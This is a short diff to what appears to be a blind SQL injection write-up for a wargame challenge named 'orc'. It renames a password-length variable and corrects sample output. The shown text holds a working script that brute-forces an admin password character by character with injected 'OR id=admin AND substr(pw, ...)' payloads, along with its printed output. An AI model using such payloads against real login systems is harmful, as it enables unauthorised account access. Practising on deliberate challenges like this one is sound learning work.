@@ -188,7 +188,7 @@ for x in range(0, 10):
   response = requests.get(full_url, cookies=cookies)
     
   if "Hello admin" in response.text:
-    pw_length = x
+    password_length = x
     break
 
 print()    
@@ -199,7 +199,7 @@ print()
 password = ""
 searchspace = string.digits + string.ascii_letters
 
-for index in range(1, pw_length + 1):
+for index in range(1, password_length + 1):
   for char in searchspace:
     payload = f"' OR id='admin' AND substr(pw, {index}, 1)='{char}' -- -"
     encoded_payload = urllib.parse.quote_plus(payload)
@@ -222,7 +222,7 @@ print(f"Final payload: ?pw={password}")
 $ python .\orc_script.py
 
 Payload: ?pw=' OR id='admin' AND length(pw)=8 -- -
-Password length: 0
+Password length: 8
 
 Payload: ?pw=' OR id='admin' AND substr(pw, 1, 1)='0' -- -
 Character at index 1: 0
